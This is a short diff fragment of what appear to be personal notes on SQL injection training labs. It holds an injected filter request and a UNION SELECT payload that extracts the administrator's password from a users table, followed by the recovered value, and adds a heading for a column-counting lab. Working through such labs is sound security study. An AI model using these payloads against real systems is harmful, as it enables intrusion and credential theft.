@@ -123,5 +123,5 @@ ANS : GET /filter?category=Gifts'--+
 
       'UNION SELECT PASSWORD_KWSPKR,'ABC' FROM USERS_BYFICP WHERE USERNAME_SLTNDT='administrator' --+  : nvtzkic1pfd8yay6eptu
 
-
-
+___________________________________________________________________________________________
+Lab7: SQL injection UNION attack, determining the number of columns returned by the query
